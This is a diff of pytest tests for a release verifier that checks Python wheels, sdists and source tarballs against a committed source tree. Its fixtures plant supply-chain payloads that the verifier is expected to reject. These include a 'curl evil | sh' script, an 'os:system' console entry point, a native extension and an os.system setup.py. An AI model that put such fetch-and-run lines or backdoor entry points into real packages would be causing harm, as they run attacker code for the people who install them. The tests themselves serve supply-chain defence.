@@ -6,6 +6,7 @@ fixtures. The synthetic helpers build a release whose reports' source snapshot
 and whose distributions' csg/*.py are genuinely derived from a source tree, so a
 tamper anywhere breaks a binding.
 """
+import hashlib
 import io
 import json
 import os
@@ -425,6 +426,204 @@ def test_verify_release_rejects_wheel_with_smuggled_top_level_module(release):
     assert "evilpkg" in bad["message"]
 
 
+def test_wheel_binding_violations_whole_tree_policy(tmp_path):
+    # Issue #3 (hardened): a wheel is bound to the archive tree like an sdist. Genuine
+    # csg/*.py byte-match and the single csg-<ver>.dist-info metadata dir is allowlisted,
+    # but a native .so / .pyc dropped into the installed package, ANY .data install
+    # payload (scripts onto PATH, purelib/platlib/data into site-packages), and a decoy
+    # *.data / *.dist-info dir whose stem is not csg are all reported unbound.
+    genuine = {"csg/__init__.py": b"v=1\n", "csg/solver.py": b"def solve():\n    return 42\n"}
+    tree_all = {rel: hashlib.sha256(data).hexdigest() for rel, data in genuine.items()}
+    tree_all["pyproject.toml"] = hashlib.sha256(b"[project]\n").hexdigest()
+    whl = tmp_path / "csg-9.9.9-py3-none-any.whl"
+    with zipfile.ZipFile(whl, "w") as zf:
+        for rel, data in genuine.items():
+            zf.writestr(rel, data)                                            # byte-bound
+        zf.writestr("csg-9.9.9.dist-info/METADATA", b"Name: csg\n")           # metadata
+        zf.writestr("csg-9.9.9.dist-info/entry_points.txt",
+                    b"[console_scripts]\ncsg-solver = csg.solver:main\n")      # csg target ok
+        zf.writestr("csg/_speedups.so", b"\x7fELFnative")                     # native, not in tree
+        zf.writestr("csg/__pycache__/solver.cpython-312.pyc", b"bytecode")    # bytecode
+        zf.writestr("csg-9.9.9.data/scripts/evil", b"#!/bin/sh\n")            # PATH payload
+        zf.writestr("csg-9.9.9.data/purelib/csg/sneak.py", b"# into site-packages\n")
+        zf.writestr("csg-9.9.9.data/data/bin/evil", b"# prefix/bin lands on PATH\n")
+        zf.writestr("evil.dist-info/RECORD", b"decoy metadata dir\n")         # decoy .dist-info
+        zf.writestr("evil.data/x.py", b"# decoy .data dir\n")                 # decoy .data
+    rogue, tree_mismatch, unbound = vr._wheel_binding_violations(whl, tree_all)
+    assert tree_mismatch == []
+    assert rogue == []  # the sole entry point targets csg.* → allowed
+    for u in ("csg/_speedups.so", "csg/__pycache__/solver.cpython-312.pyc",
+              "csg-9.9.9.data/scripts/evil", "csg-9.9.9.data/purelib/csg/sneak.py",
+              "csg-9.9.9.data/data/bin/evil", "evil.dist-info/RECORD", "evil.data/x.py"):
+        assert u in unbound, u
+    # The genuine package + its real metadata are never flagged.
+    assert "csg/__init__.py" not in unbound and "csg/solver.py" not in unbound
+    assert not any(u.startswith("csg-9.9.9.dist-info/") for u in unbound)
+
+
+def test_wheel_binding_flags_tampered_file_and_rogue_entry_point(tmp_path):
+    # Issue #3 (hardened): a tracked file that diverges is treeMismatch; a
+    # [console_scripts]/[gui_scripts] target OUTSIDE csg (pip turns it into a PATH
+    # executable at install time) is rogue, while a csg-targeted one is allowed.
+    genuine = {"csg/__init__.py": b"v=1\n", "csg/solver.py": b"def solve():\n    return 42\n"}
+    tree_all = {rel: hashlib.sha256(data).hexdigest() for rel, data in genuine.items()}
+    whl = tmp_path / "csg-9.9.9-py3-none-any.whl"
+    with zipfile.ZipFile(whl, "w") as zf:
+        zf.writestr("csg/__init__.py", genuine["csg/__init__.py"])
+        zf.writestr("csg/solver.py", b"def solve():\n    return 'evil'\n")    # tampered
+        zf.writestr("csg-9.9.9.dist-info/entry_points.txt",
+                    b"[console_scripts]\nbackdoor = os:system\n"             # outside csg → bad
+                    b"[gui_scripts]\ngui = csg.app:main\n")                  # csg → ok
+    rogue, tree_mismatch, unbound = vr._wheel_binding_violations(whl, tree_all)
+    assert "csg/solver.py" in tree_mismatch
+    assert any("backdoor" in r and "os:system" in r for r in rogue)
+    assert not any("csg.app:main" in r for r in rogue)
+
+
+def test_verify_release_rejects_wheel_with_native_extension(release):
+    # Issue #3 (hardened): a native csg/_speedups.so (executes arbitrary code on import,
+    # invisible to the csg/*.py byte binding) must fail the whole-tree wheel binding.
+    src = release["source_tree"]
+    _build_wheel(release["assets"] / "csg-9.9.9-py3-none-any.whl", src,
+                 files={**{p.relative_to(src).as_posix(): p.read_bytes()
+                           for p in (src / "csg").rglob("*.py")},
+                        "csg/_speedups.so": b"\x7fELF arbitrary native code\n"})
+    rm.write_sha256sums(release["assets"])
+    _write_json(release["assets"] / "release_manifest.json",
+                rm.build_manifest(tag="v9.9.9", commit=COMMIT, asset_dir=release["assets"],
+                                  reports_root=release["tmp"] / "reports_src", version="9.9.9", seeds=30))
+    report = _verify(release)
+    assert report["ok"] is False
+    bad = next(c for c in report["checks"] if c["name"] == "source_dist:csg-9.9.9-py3-none-any.whl")
+    assert "csg/_speedups.so" in bad["message"] and "unbound" in bad["message"]
+
+
+def test_verify_release_rejects_wheel_data_scripts_payload(release):
+    # Issue #3 (proof case): a wheel with genuine csg/*.py PLUS a
+    # <name>.data/scripts/<x> entry — pip installs that onto PATH as an executable —
+    # must NOT pass the source-distribution binding. Before this fix the .data suffix
+    # was blanket-allowlisted, so the trojan rode along with a clean verdict.
+    src = release["source_tree"]
+    _build_wheel(release["assets"] / "csg-9.9.9-py3-none-any.whl", src,
+                 files={**{p.relative_to(src).as_posix(): p.read_bytes()
+                           for p in (src / "csg").rglob("*.py")},
+                        "csg-9.9.9.data/scripts/evil": b"#!/bin/sh\ncurl evil | sh\n"})
+    rm.write_sha256sums(release["assets"])
+    _write_json(release["assets"] / "release_manifest.json",
+                rm.build_manifest(tag="v9.9.9", commit=COMMIT, asset_dir=release["assets"],
+                                  reports_root=release["tmp"] / "reports_src", version="9.9.9", seeds=30))
+    report = _verify(release)
+    assert report["ok"] is False
+    bad = next(c for c in report["checks"] if c["name"] == "source_dist:csg-9.9.9-py3-none-any.whl")
+    assert "csg-9.9.9.data/scripts/evil" in bad["message"]
+
+
+def test_verify_release_rejects_sdist_sibling_backdoor(release):
+    # Issue #2: a backdoor package smuggled OUTSIDE csg/ in the *sdist* (intact csg
+    # source) must fail. Before the whole-tree binding, the sdist branch only read
+    # csg/*.py and ignored siblings, so this passed silently.
+    src = release["source_tree"]
+    files = {f"csg-9.9.9/{p.relative_to(src).as_posix()}": p.read_bytes()
+             for p in (src / "csg").rglob("*.py")}
+    files["csg-9.9.9/evilpkg/__init__.py"] = b"import os  # BACKDOOR outside csg/\n"
+    _build_sdist(release["assets"] / "csg-9.9.9.tar.gz", src, files=files)
+    rm.write_sha256sums(release["assets"])
+    _write_json(release["assets"] / "release_manifest.json",
+                rm.build_manifest(tag="v9.9.9", commit=COMMIT, asset_dir=release["assets"],
+                                  reports_root=release["tmp"] / "reports_src", version="9.9.9", seeds=30))
+    report = _verify(release)
+    assert report["ok"] is False
+    bad = next(c for c in report["checks"] if c["name"] == "source_dist:csg-9.9.9.tar.gz")
+    assert "evilpkg/__init__.py" in bad["message"] and "unbound" in bad["message"]
+
+
+def test_verify_release_rejects_sdist_tampered_noncsg_file(release):
+    # Issue #2: a committed non-csg file tampered inside the sdist (here README.md,
+    # which the csg-only binding never inspected) must be caught by the tree binding.
+    src = release["source_tree"]
+    files = {f"csg-9.9.9/{p.relative_to(src).as_posix()}": p.read_bytes()
+             for p in (src / "csg").rglob("*.py")}
+    files["csg-9.9.9/README.md"] = b"# tampered readme with an injected payload\n"
+    _build_sdist(release["assets"] / "csg-9.9.9.tar.gz", src, files=files)
+    rm.write_sha256sums(release["assets"])
+    _write_json(release["assets"] / "release_manifest.json",
+                rm.build_manifest(tag="v9.9.9", commit=COMMIT, asset_dir=release["assets"],
+                                  reports_root=release["tmp"] / "reports_src", version="9.9.9", seeds=30))
+    report = _verify(release)
+    assert report["ok"] is False
+    bad = next(c for c in report["checks"] if c["name"] == "source_dist:csg-9.9.9.tar.gz")
+    assert "README.md" in bad["message"] and "treeMismatch" in bad["message"]
+
+
+def test_verify_release_accepts_sdist_with_setuptools_metadata(release):
+    # Whole-tree binding must NOT false-positive on a real setuptools sdist: the
+    # generated metadata (PKG-INFO, setup.cfg, *.egg-info/*) is allowlisted, and
+    # committed files match the archive byte-for-byte.
+    src = release["source_tree"]
+    files = {f"csg-9.9.9/{p.relative_to(src).as_posix()}": p.read_bytes()
+             for p in (src / "csg").rglob("*.py")}
+    files["csg-9.9.9/README.md"] = SRC_FILES["README.md"]          # committed → byte-bound
+    files["csg-9.9.9/pyproject.toml"] = SRC_FILES["pyproject.toml"]
+    files["csg-9.9.9/PKG-INFO"] = b"Metadata-Version: 2.1\nName: csg\n"  # generated → allowlisted
+    files["csg-9.9.9/setup.cfg"] = b"[egg_info]\n"
+    for meta in ("PKG-INFO", "SOURCES.txt", "top_level.txt", "entry_points.txt",
+                 "requires.txt", "dependency_links.txt"):
+        files[f"csg-9.9.9/csg.egg-info/{meta}"] = b"x\n"
+    _build_sdist(release["assets"] / "csg-9.9.9.tar.gz", src, files=files)
+    rm.write_sha256sums(release["assets"])
+    _write_json(release["assets"] / "release_manifest.json",
+                rm.build_manifest(tag="v9.9.9", commit=COMMIT, asset_dir=release["assets"],
+                                  reports_root=release["tmp"] / "reports_src", version="9.9.9", seeds=30))
+    report = _verify(release)
+    sd = next(c for c in report["checks"] if c["name"] == "source_dist:csg-9.9.9.tar.gz")
+    assert sd["ok"] is True, sd["message"]
+
+
+def test_verify_source_distributions_binds_full_source_tarball(tmp_path):
+    # Issue #2: a full repo *source tarball* (git-archive style) is bound file-for-file
+    # against the archive tree — including paths OUTSIDE SOURCE_PROVENANCE_GLOBS such as
+    # scripts/, which the report-snapshot binding cannot see. A clean tarball passes; a
+    # tampered script or a planted file fails.
+    tree = tmp_path / "tree"
+    _write_tree(tree)
+    (tree / "scripts").mkdir()
+    (tree / "scripts" / "build.sh").write_bytes(b"#!/bin/sh\necho honest\n")  # NOT in any glob
+    tree_all = vr._tree_all_files(tree)
+    expected_csg = vr._tree_csg_sources(tree)
+
+    def make_source_tarball(dest, *, mutate=None):
+        files = {f"wide-robot-9.9.9/{p.relative_to(tree).as_posix()}": p.read_bytes()
+                 for p in tree.rglob("*") if p.is_file()}
+        if mutate:
+            mutate(files)
+        with tarfile.open(dest, "w:gz") as tar:
+            for name, data in files.items():
+                info = tarfile.TarInfo(name)
+                info.size = len(data)
+                tar.addfile(info, io.BytesIO(data))
+        return dest
+
+    clean = make_source_tarball(tmp_path / "wide-robot-9.9.9-source.tar.gz")
+    checks = vr.verify_source_distributions({clean.name: clean}, expected_csg, tree_all=tree_all)
+    assert all(c["ok"] for c in checks), [c for c in checks if not c["ok"]]
+
+    # Tamper a committed script (outside the provenance globs → snapshot is blind to it).
+    tampered = make_source_tarball(
+        tmp_path / "t1-source.tar.gz",
+        mutate=lambda f: f.update({"wide-robot-9.9.9/scripts/build.sh": b"#!/bin/sh\ncurl evil | sh\n"}))
+    checks = vr.verify_source_distributions({tampered.name: tampered}, expected_csg, tree_all=tree_all)
+    bad = next(c for c in checks if c["name"] == f"source_dist:{tampered.name}")
+    assert not bad["ok"] and "scripts/build.sh" in bad["message"] and "treeMismatch" in bad["message"]
+
+    # Plant a brand-new file not in the tree (and not setuptools metadata) → unbound.
+    planted = make_source_tarball(
+        tmp_path / "t2-source.tar.gz",
+        mutate=lambda f: f.update({"wide-robot-9.9.9/setup.py": b"import os; os.system('evil')\n"}))
+    checks = vr.verify_source_distributions({planted.name: planted}, expected_csg, tree_all=tree_all)
+    bad = next(c for c in checks if c["name"] == f"source_dist:{planted.name}")
+    assert not bad["ok"] and "setup.py" in bad["message"] and "unbound" in bad["message"]
+
+
 def test_verify_release_rejects_decoy_report_tarball(release):
     # F2: a second report tarball must not mask the real one.
     import shutil
@@ -469,10 +668,15 @@ def _inject_source_tree(monkeypatch, source_tree):
     monkeypatch.setattr(vr, "rederive_evidence", lambda *a, **k: [])
 
 
-def test_main_returns_0_on_good_release(release, monkeypatch):
+def test_main_returns_1_on_good_but_self_attested_release(release, monkeypatch):
+    # A release that passes every check but whose MuJoCo physics is self-attested
+    # (tag not in ATTESTED_TAGS; here re-derivation is also stubbed off) must NOT
+    # exit 0 — that would read as a full verification. It exits 1 (incomplete
+    # coverage), with ok=True (no check failed). Exit 0 is reserved for a fully
+    # bound release (see test_verify_release_orchestration_enforces_attestation).
     _inject_source_tree(monkeypatch, release["source_tree"])
     rc = vr.main(["--tag", "v9.9.9", "--asset-dir", str(release["assets"]), "--no-download"])
-    assert rc == 0
+    assert rc == 1
 
 
 def test_main_returns_2_on_commit_mismatch(release, monkeypatch):
@@ -631,7 +835,9 @@ def test_end_to_end_against_a_real_git_repo(tmp_path, monkeypatch):
     # the flagship tool, exercised end to end (no git-layer monkeypatching).
     monkeypatch.chdir(repo)
     rc = vr.main(["--tag", "vtest", "--asset-dir", str(assets), "--no-download", "--no-rederive"])
-    assert rc == 0
+    # --no-rederive + self-attested MuJoCo → evidence incomplete → exit 1 (passing
+    # checks, but not a full verification), not 0.
+    assert rc == 1
 
     # A trojan in the committed-vs-distributed source is caught end to end.
     _build_wheel(assets / "csg-9.9.9-py3-none-any.whl", src,
@@ -734,9 +940,10 @@ def test_resolve_tag_commit_unresolved_raises(tmp_path):
 def test_main_json_output_smoke(release, monkeypatch, capsys):
     _inject_source_tree(monkeypatch, release["source_tree"])
     rc = vr.main(["--tag", "v9.9.9", "--asset-dir", str(release["assets"]), "--no-download", "--json"])
-    assert rc == 0
+    assert rc == 1  # self-attested: ok=True but coverage incomplete → exit 1
     out = json.loads(capsys.readouterr().out)
     assert out["ok"] is True and out["schemaVersion"] == "csg.verify_release.v1"
+    assert out["evidence"]["complete"] is False
 
 
 def test_remote_commit_mismatch_fires_check(release, monkeypatch):
@@ -920,12 +1127,18 @@ def test_attestation_missing_gh_is_operational(tmp_path, monkeypatch):
 
 
 def test_verify_release_orchestration_enforces_attestation(release, monkeypatch):
-    # Wired end to end: an ATTESTED tag with a valid attestation passes; a rejected
-    # attestation fails the release (exit 2, fail-closed).
+    # Wired end to end: an ATTESTED tag with a valid attestation AND bound deterministic
+    # evidence is fully verified (exit 0); a rejected attestation fails the release
+    # (exit 2, fail-closed). This is the one path that legitimately returns exit 0.
     _inject_source_tree(monkeypatch, release["source_tree"])
+    # _inject_source_tree stubs re-derivation to no checks; here the release is fully
+    # bound, so model a passing re-derivation so deterministic evidence counts as bound.
+    monkeypatch.setattr(vr, "rederive_evidence",
+                        lambda *a, **k: [{"name": "rederive:symbolic", "ok": True, "message": "stub bound"}])
     monkeypatch.setattr(vr, "ATTESTED_TAGS", frozenset({"v9.9.9"}))
     bindir = _fake_gh(release["tmp"] / "ghbin", exit_code=0)
     monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
+    # Deterministic re-derived AND MuJoCo attested → evidence.complete → exit 0.
     assert vr.main(["--tag", "v9.9.9", "--asset-dir", str(release["assets"]), "--no-download"]) == 0
 
     # gh cryptographically rejects → release-bad (exit 2, fail-closed).
@@ -943,6 +1156,105 @@ def test_attestation_offline_is_operational_exit_3(tmp_path, monkeypatch):
     monkeypatch.setattr(vr, "ATTESTED_TAGS", frozenset({"v9.9.9"}))
     with pytest.raises(vr.VerifyReleaseError, match="operational"):
         vr.verify_attestation(tmp_path, "v9.9.9", frozenset({"csg-1.0.whl"}), repo=vr.CANONICAL_REPO)
+
+
+# Verbatim gh 2.69.0 wording (NOT a guessed marker) — these lock the classifier to the
+# real CLI output, the exact gap that let a missing attestation read as "operational".
+_GH_404_NO_ATTESTATION = (
+    "Loaded digest sha256:abc123 for file://csg-1.0.whl\n"
+    "Error: failed to fetch attestations from alex-reysa/wide-robot: "
+    "HTTP 404: Not Found (https://api.github.com/orgs/alex-reysa/attestations/sha256:abc123)\n"
+)
+_GH_IDENTITY_MISMATCH = (
+    "Loaded digest sha256:abc123 for file://csg-1.0.whl\n"
+    "Loaded 1 attestation from GitHub API\n"
+    'Error: verifying with issuer "sigstore.dev"\n'
+    "- no matching attestations found: the attestation's certificate SAN does not "
+    "match the expected signer workflow identity\n"
+)
+_GH_CONN_REFUSED = (
+    "Error: failed to fetch attestations from alex-reysa/wide-robot: "
+    'Get "https://api.github.com/...": dial tcp 140.82.121.6:443: connect: connection refused\n'
+)
+_GH_TLS_BLIP_WITH_IDENTITY_WORD = (
+    'Error: failed to fetch attestations: Get "https://api.github.com/...": '
+    "net/http: TLS handshake timeout (while resolving signer identity and signature)\n"
+)
+_GH_HTTP_401 = (
+    "Error: failed to fetch attestations from alex-reysa/wide-robot: "
+    "HTTP 401: Requires authentication (https://api.github.com/...)\n"
+)
+_GH_HTTP_503 = (
+    "Error: failed to fetch attestations from alex-reysa/wide-robot: "
+    "HTTP 503: Service Unavailable (https://api.github.com/...)\n"
+)
+
+
+def _fake_gh_message(bindir, *, exit_code, stderr_text):
+    """A fake ``gh`` that emits a *verbatim* (possibly multi-line, punctuation-heavy)
+    message on stderr and exits with ``exit_code``. Unlike ``_fake_gh`` it cats the
+    text from a file, so the real gh wording survives shell quoting intact."""
+    bindir.mkdir(parents=True, exist_ok=True)
+    msg_file = bindir / "gh_stderr.txt"
+    msg_file.write_text(stderr_text)
+    fake = bindir / "gh"
+    fake.write_text(f"#!/usr/bin/env bash\ncat {msg_file} >&2\nexit {exit_code}\n")
+    fake.chmod(0o755)
+    return bindir
+
+
+def test_classify_gh_attestation_failure_keys_on_structure_not_english():
+    # Issue #4: classify on HTTP status + transport substrings, not loose English.
+    cl = vr._classify_gh_attestation_failure
+    # A missing attestation (HTTP 404) and an identity/SAN mismatch are REFUTED (exit 2,
+    # fail-closed) — the 404 wording carries none of the old "signature/identity" markers.
+    assert cl(_GH_404_NO_ATTESTATION) == "refuted"
+    assert cl(_GH_IDENTITY_MISMATCH) == "refuted"
+    # Transport / auth / server failures are OPERATIONAL (exit 3): can't complete ≠ bad.
+    assert cl(_GH_CONN_REFUSED) == "operational"
+    assert cl(_GH_HTTP_401) == "operational"
+    assert cl(_GH_HTTP_503) == "operational"
+    # Inverse of the old bug: a TLS blip that happens to contain "identity"/"signature"
+    # must NOT be branded a refutation — the transport marker wins.
+    assert cl(_GH_TLS_BLIP_WITH_IDENTITY_WORD) == "operational"
+    # A definitive 404/"no attestation" verdict is not masked by a transient marker that
+    # happens to co-occur in the same blob (fail-closed wins over an incidental retry log).
+    assert cl(_GH_404_NO_ATTESTATION + "warning: i/o timeout on a retry\n") == "refuted"
+
+
+def test_attestation_missing_404_is_refuted_not_operational(tmp_path, monkeypatch):
+    # Issue #4 regression: the REAL gh "no attestation" message (HTTP 404) must fail the
+    # check (refuted → exit 2, fail-closed), NOT raise operational (exit 3). This is the
+    # wording the guessed marker list missed, breaking fail-closed once ATTESTED_TAGS
+    # was populated.
+    (tmp_path / "csg-1.0.whl").write_bytes(b"x")
+    bindir = _fake_gh_message(tmp_path / "bin", exit_code=1, stderr_text=_GH_404_NO_ATTESTATION)
+    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
+    monkeypatch.setattr(vr, "ATTESTED_TAGS", frozenset({"v9.9.9"}))
+    checks = vr.verify_attestation(tmp_path, "v9.9.9", frozenset({"csg-1.0.whl"}), repo=vr.CANONICAL_REPO)
+    assert any(c["name"] == "attestation:csg-1.0.whl" and not c["ok"] for c in checks)
+
+
+def test_attestation_tls_blip_is_operational_not_refuted(tmp_path, monkeypatch):
+    # Issue #4 inverse: a TLS/transport blip whose text contains "signature"/"identity"
+    # must be operational (exit 3), never brand a genuine release "bad" (exit 2).
+    (tmp_path / "csg-1.0.whl").write_bytes(b"x")
+    bindir = _fake_gh_message(tmp_path / "bin", exit_code=1, stderr_text=_GH_TLS_BLIP_WITH_IDENTITY_WORD)
+    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
+    monkeypatch.setattr(vr, "ATTESTED_TAGS", frozenset({"v9.9.9"}))
+    with pytest.raises(vr.VerifyReleaseError, match="operational"):
+        vr.verify_attestation(tmp_path, "v9.9.9", frozenset({"csg-1.0.whl"}), repo=vr.CANONICAL_REPO)
+
+
+def test_main_missing_attestation_404_fails_closed_exit_2(release, monkeypatch):
+    # Issue #4 end-to-end: with ATTESTED_TAGS populated, a MISSING attestation (the real
+    # gh HTTP 404 wording, served for every asset) must fail the release closed (exit 2),
+    # not read as "couldn't check" (exit 3) — the headline fail-closed property.
+    _inject_source_tree(monkeypatch, release["source_tree"])
+    monkeypatch.setattr(vr, "ATTESTED_TAGS", frozenset({"v9.9.9"}))
+    bindir = _fake_gh_message(release["tmp"] / "ghbin", exit_code=1, stderr_text=_GH_404_NO_ATTESTATION)
+    monkeypatch.setenv("PATH", f"{bindir}{os.pathsep}{os.environ['PATH']}")
+    assert vr.main(["--tag", "v9.9.9", "--asset-dir", str(release["assets"]), "--no-download"]) == 2
 
 
 def test_evidence_coverage_surfaced_and_strict_fails_self_attested(release, monkeypatch):
@@ -974,7 +1286,9 @@ def test_no_attestation_and_no_rederive_flags(release, monkeypatch):
     _inject_source_tree(monkeypatch, release["source_tree"])
     rc = vr.main(["--tag", "v9.9.9", "--asset-dir", str(release["assets"]),
                   "--no-download", "--no-attestation", "--no-rederive"])
-    assert rc == 0
+    # Opting out of both binding layers leaves evidence unbound → exit 1 (honest:
+    # skipped layers are not silently treated as a full verification).
+    assert rc == 1
     report = vr.verify_release(
         "v9.9.9", asset_dir=str(release["assets"]), expected_commit=COMMIT,
         source_tree=str(release["source_tree"]), seeds=30, rederive=False, verify_attestations=False,
